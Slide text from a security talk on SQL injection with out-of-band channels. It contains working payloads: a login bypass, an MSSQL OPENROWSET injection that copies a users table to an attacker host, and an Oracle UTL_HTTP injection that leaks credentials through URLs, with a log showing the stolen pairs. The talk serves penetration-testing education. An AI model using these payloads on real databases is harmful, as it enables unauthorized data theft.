SQL – Injection & 
OOB – channels
Patrik Karlsson, Inspect it
For an updated version of this presentation check 
http://www.inspectit.se/dc15.html
Introduction
• Who am I
– Patrik Karlsson
– Information Security Consultant
– Owner of Inspect it
– Founder of cqure.net
Introduction
• What do I do?
– Penetration testing
– Application Security Reviews
– Source code reviews
– General information security audits
Introduction
• What am I presenting?
– A speech on SQL-injection with focus on 
out-of-band channeling
– A number of examples using this 
technique
• Why?
– Because we’re still seeing a lot of 
vulnerable applications …
– Tunneling data is fun?
Introduction
• What am I not presenting?
– The basics of SQL injection
– An arsenal of tools for automatic 
scanning/hacking web applications
– The silver bullet solution to all SQL – 
injection problems
A very brief recap
SQL – injection
What is SQL – injection
• High risk security vulnerability
• The ability to inject arbitrary SQL code through 
poorly validated application parameters
• Occurs due to inadequate design and input 
validation controls
• Depending on privileges/patch-levels consequences 
may range from troublesome to devastating
• All source code variables containing data provided 
by the user could be vulnerable
– Forms, URL-parameters, cookies, referrer, user-agent  … 
SQL – injection exemplified
• A classic example
sql = “SELECT usr_id FROM tbl_users
WHERE usr_name = ‘” + sUser + ”’ AND 
usr_pass=‘” + sPass + “’”
• What if the user supplies the following 
password ‘ OR 1=1 --
SQL – injection &
OOB channels
OOB – channels introduction
• Relies on “traditional” SQL-injection 
weaknesses for exploitation
• Contrary to in-band injection it uses 
an alternative channel to return data
• This channel can take many different 
forms: timing, http, DNS
• Several different approaches exists 
which dependend on the backend DB
OOB – channels introduction
• Exploitation using OOB-channels becomes 
interesting when
– detailed error messages are disabled
– control is gained “late” in a query
– able to inject a second query (batching)
– results are being limited/filtered
– outbound firewall rules are lax
– reducing the number of queries is important
– blind SQL injection looks like the only option
OOB – channels introduction
• In order to illustrate where OOB-
channeling can be useful
– Consider enumerating information from 
the following vulnerable code (x marks 
user input)
SELECT topic FROM news ORDER BY x
EXEC sp_logon @name=’admin’, @pass=’x’
SELECT TOP 1 id FROM t WHERE name=’x’
OOB – channels introduction
• Depending on a number of factors a 
channel can be more or less suitable
• Three approaches will be discussed 
along with their respective limitations
– Channeling data using OPENROWSET
– Channeling data using UTL_HTTP
– Channeling data over DNS
OPENROWSET
OPENROWSET – introduction 
– Available in Microsoft SQL Server
– Allows information to be retrieved from 
alternate data provider
– Can be used together with UNION in order 
to merge with existing dataset
– Disabled by default in MSSQL 2005
OPENROWSET – syntax
OPENROWSET 
( { 'provider_name' , { 'datasource' ; 'user_id' ; 'password' 
| 'provider_string' }
, { [ catalog. ] [ schema. ] object 
| 'query' 
}
| BULK 'data_file' ,
{ FORMATFILE = 'format_file_path' 
[ ]
| SINGLE_BLOB | SINGLE_CLOB | SINGLE_NCLOB }
} ) 
OPENROWSET – example
• Classic example enumerating data 
from “neighbor” database
… UNION ALL SELECT a.* FROM 
OPENROWSET(‘SQLOLEDB',
'uid=sa;pwd=;Network=DBMSSOCN;
Address=10.10.10.10;timeout=1',
‘SELECT user, pass FROM users') 
AS a--
OPENROWSET – illustration
OPENROWSET
• So how is this relevant in regards to 
OOB-channels?
– OPENROWSET can be reversed in order to 
INSERT data into a data source
– This would allow us to fetch data from one 
source and insert it to another
– The destination DB could be any host 
reachable from the source
– Allows for information enumeration 
through “batching” statements
OPENROWSET – example
SELECT usr_id FROM tbl_users
WHERE usr_name = ‘patrik’ AND 
usr_pass=‘secret’;INSERT INTO 
OPENROWSET('SQLOLEDB',
'uid=haxxor;pwd=31337;
Network=DBMSSOCN;
Address=th3.h4xx0r.c0m,443;
timeout=5','SELECT * FROM users') 
SELECT * from users --
OPENROWSET – illustration
OPENROWSET – considerations
• Obstacles
– Destination DB needs to be reachable from 
source DB
– Source and destination tables need to be 
identical
• Solutions
– HTTP(S), FTP are ports which tend to be 
available for outgoing connections
– SYSOBJECTS and SYSCOLUMNS contain 
everything we would ever wish for :)
OPENROWSET – summary
• OPENROWSET as OOB – channel
– There are still quite a few < 2005 DB’s out there
– Many databases are still left unhardened
– Firewalls tend to be less strict outbound
• Limitations
– Limited to Microsoft SQL Server
– Disabled by default in MS SQL 2005
– Hardening guides suggest disabling
– Requires a direct outbound connection to the attackers DB
– By default, in SQL Server SP3 or later, users need to be 
members of the sysadmin role
Oracle – UTL_HTTP
UTL_HTTP – introduction
• UTL_HTTP allows for web pages to be 
downloaded through SQL queries
• The following query returns 2000 bytes from 
the Oracle web page
– SELECT utl_http.request('http://www.oracle.com/') FROM dual
• Possible to exploit as an OOB channel 
by dynamically building the URL
• Retrieved data can be seen in web 
server log files
UTL_HTTP – example
• Example of “late” exploitation
SELECT topic FROM news
ORDER BY (select 
utl_http.request('http://www.cq
ure.net/INJ/'||(select uname || 
‘_’ || upass from tbl_logins 
where rownum<2)||'') from dual)
UTL_HTTP – illustration
UTL_HTTP – logfile sample
"GET /inj/ADMIN_NIMDA HTTP/1.1" 200
"GET /inj/USER_SECRET HTTP/1.1" 200
"GET /inj/PETER_MARY1 HTTP/1.1" 200 
“GET /inj/FRED_JANE99 HTTP/1.1" 200 
“GET /inj/HENRY_CARS1 HTTP/1.1" 200
"GET /inj/MARY_PETER2 HTTP/1.1" 200
"GET /inj/JANE_FLOWER HTTP/1.1" 200
UTL_HTTP – summary
• UTL_HTTP as OOB – channel
– Many databases are still left unhardened
– Firewalls tend to be less strict outbound
• Limitations
– Limited to Oracle RDBMS
– Hardening guides suggest disabling
– Requires a direct outgoing connection to 
the attackers webserver
 30
DNS as OOB – channel
DNS
• DNS is a hierarchical protocol
• Let’s assume we manage the DNS server for 
the zone cqure.net
• If someone at Corporation X looks up a host 
in our domain eg. www.cqure.net a query 
will find its way to us
• This would allow us to monitor queries for 
sub-domains or hosts in this domain
Why is DNS interesting?
• Even when DB’s have been hardened and restricted 
from communicating with the Internet they often do 
DNS
• Most internal DNS servers are allowed to forward 
their queries
• Most hardening guides fail to mention a number of 
functions that can be used to initiate DNS queries 
• This provides us with an indirect channel to a DNS 
server of our choice
• If we could trigger DNS resolution we could ask for 
hosts in our zone
DNS as OOB – channel
DNS as OOB – channel